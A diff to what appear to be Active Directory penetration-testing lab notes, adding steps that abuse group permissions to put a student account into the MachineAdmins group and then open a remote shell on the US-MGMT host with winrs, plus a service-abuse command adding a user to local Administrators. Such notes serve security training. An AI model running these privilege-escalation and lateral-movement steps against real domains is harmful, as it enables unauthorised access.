@@ -184,7 +184,7 @@ ServiceAbused Command
 ------------- -------
 ALG           net localgroup Administrators us\studentuser34 /add
 ```
-## Identify Machine Admin Access
+## Identify machine admin access
 
 ```
 PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
@@ -374,5 +374,42 @@ IdentityReferenceName   : managers
 IdentityReferenceDomain : us.techcorp.local
 IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
 IdentityReferenceClass  : group
+
+```
+
+Set permissions:
+
+```
+PS C:\AD\Tools\ADModule-master> Get-ADGroup -Identity machineadmins -Properties Description
+
+
+Description       : Group to manage machines of the Mgmt OU
+DistinguishedName : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+Name              : MachineAdmins
+ObjectClass       : group
+ObjectGUID        : a02c806e-f233-4c39-a0cc-adf37628365a
+SamAccountName    : machineadmins
+SID               : S-1-5-21-210670787-2521448726-163245708-1118
+```
+```
+Add-ADGroupMember -Identity MachineAdmins -Members studentuser17 -Verbose
+VERBOSE: Performing the operation "Set" on target "CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local".
+```
+
+Access to US-MGMT:
+```
+C:\Users\studentuser17>winrs -r:us-mgmt cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\studentuser17>whoami
+whoami
+us\studentuser17
+
+C:\Users\studentuser17>hostname
+hostname
+US-Mgmt
 
 ```
